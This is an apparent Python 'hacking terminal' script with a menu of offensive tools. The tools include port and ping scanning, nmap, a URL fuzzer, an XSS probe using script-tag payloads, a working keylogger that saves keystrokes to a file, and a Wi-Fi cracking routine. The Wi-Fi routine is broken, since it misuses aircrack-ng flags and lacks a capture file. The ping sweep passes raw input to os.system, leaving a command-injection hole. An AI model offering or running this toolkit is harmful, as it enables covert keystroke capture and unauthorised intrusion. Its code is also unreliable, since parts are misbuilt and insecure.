import socket
import subprocess
import os
import requests
import time
from pynput import keyboard
from urllib.parse import urlparse
import nmap
from termcolor import colored  # Importing termcolor for colored output


# Function to display a symbolic ASCII art made of fewer symbols
def display_hacking_drawing():
    drawing = '''
        ##########    ##########    ##########
       ##      ##   ##      ##   ##      ##
      ##        ##  ##      ##  ##        ##
      ##  ##    ##  ##      ##  ##   #### ##
      ##  ##    ##  ##      ##  ##   ##    ##
      ##  ##    ##  ##      ##  ##    ######
       ##      ##   ##      ##   ##    ##
        ##########    ##########    ######

        Welcome to the Digital Hacking Terminal
    '''
    # Adding colors to the ASCII Art drawing using termcolor
    print(colored(drawing, 'green'))  # Using green to color the symbols
    print(colored("Make sure you have permission before testing any tool.", 'red'))


# Function 1: Basic Port Scanner
def port_scanner(target, start_port, end_port):
    print(f"Scanning {target} for open ports...")
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port} is open")
        sock.close()


# Function 2: Simple Ping Sweep
def ping_sweep(network):
    print(f"Performing ping sweep on network: {network}")
    for i in range(1, 255):
        ip = f"{network}.{i}"
        response = os.system(f"ping -c 1 {ip}")
        if response == 0:
            print(f"Host {ip} is up")


# Function 3: DNS Lookup
def dns_lookup(domain):
    print(f"Performing DNS lookup for {domain}...")
    try:
        ip_address = socket.gethostbyname(domain)
        print(f"The IP address of {domain} is {ip_address}")
    except socket.gaierror:
        print(f"Failed to get IP address for {domain}")


# Function 4: HTTP Header Fetcher
def fetch_http_headers(url):
    print(f"Fetching HTTP headers for {url}...")
    response = requests.head(url)
    print("HTTP Headers:", response.headers)


# Function 5: Basic HTTP Server (for testing)
def start_http_server(port=8080):
    print(f"Starting a simple HTTP server on port {port}...")
    subprocess.run(["python3", "-m", "http.server", str(port)])


# Function 6: Simple Keylogger
def start_keylogger():
    keystrokes = []

    def on_press(key):
        try:
            keystrokes.append(key.char)
        except AttributeError:
            keystrokes.append(str(key))
        print("Key pressed:", key)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    with open('keystrokes.txt', 'w') as file:
        file.write(''.join(keystrokes))
    print("Keystrokes saved to keystrokes.txt")


# Function 7: Simple URL Fuzzer (for basic vulnerability scanning)
def url_fuzzer(url):
    print(f"Fuzzing URL {url} for vulnerabilities...")
    for i in range(1, 10):
        target_url = f"{url}/test{i}"
        response = requests.get(target_url)
        if response.status_code == 200:
            print(f"Found open URL: {target_url}")
        else:
            print(f"Failed on URL: {target_url}")


# Function 8: Network Scanner with Nmap
def nmap_scan(target):
    print(f"Running Nmap scan on {target}...")
    nm = nmap.PortScanner()
    nm.scan(target, '22-1024')
    print(nm.all_hosts())
    print(nm[target])


# Function 9: Wi-Fi Cracking (Simple WPA2 Brute Force Example using PyWifi)
def wifi_crack(target_ssid, password_file):
    print(f"Attempting to crack Wi-Fi network: {target_ssid}...")
    with open(password_file, 'r') as f:
        passwords = f.readlines()
    for password in passwords:
        password = password.strip()
        result = subprocess.run(["aircrack-ng", "-w", password_file, "-b", target_ssid], capture_output=True)
        if result.returncode == 0:
            print(f"Password found: {password}")
            break
        else:
            print(f"Trying password: {password}")


# Function 10: Web Vulnerability Scanner (Basic Example)
def simple_web_vuln_scan(url):
    print(f"Scanning {url} for common web vulnerabilities...")
    payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>']
    for payload in payloads:
        response = requests.get(url, params={"input": payload})
        if payload in response.text:
            print(f"Potential XSS vulnerability found at {url} with payload {payload}")
        else:
            print(f"No vulnerability found at {url} with payload {payload}")


# Function 11: Find IP Address of a Target (New Tool)
def find_ip_address():
    domain = input("Enter domain name (e.g., example.com): ")
    dns_lookup(domain)


# Main menu
def main():
    display_hacking_drawing()  # Show the drawing with symbols and colors
    while True:
        print("\nSelect an option:")
        print("1. Port Scanner")
        print("2. Ping Sweep")
        print("3. DNS Lookup")
        print("4. HTTP Header Fetcher")
        print("5. Start Simple HTTP Server")
        print("6. Start Keylogger")
        print("7. URL Fuzzer")
        print("8. Network Scan (Nmap)")
        print("9. Wi-Fi Cracking")
        print("10. Web Vulnerability Scanner")
        print("11. Find IP Address of a Target (New Tool)")
        print("12. Exit")

        choice = input("Enter choice (1-12): ")

        if choice == '1':
            target = input("Enter target IP address: ")
            port_scanner(target, 1, 1024)
        elif choice == '2':
            network = input("Enter network address (e.g., 192.168.1): ")
            ping_sweep(network)
        elif choice == '3':
            domain = input("Enter domain name: ")
            dns_lookup(domain)
        elif choice == '4':
            url = input("Enter URL: ")
            fetch_http_headers(url)
        elif choice == '5':
            start_http_server()
        elif choice == '6':
            start_keylogger()
        elif choice == '7':
            url = input("Enter URL to fuzz: ")
            url_fuzzer(url)
        elif choice == '8':
            target = input("Enter target IP address: ")
            nmap_scan(target)
        elif choice == '9':
            ssid = input("Enter SSID to crack: ")
            password_file = input("Enter password list file: ")
            wifi_crack(ssid, password_file)
        elif choice == '10':
            url = input("Enter URL to scan: ")
            simple_web_vuln_scan(url)
        elif choice == '11':
            find_ip_address()
        elif choice == '12':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")


if __name__ == "__main__":
    main()
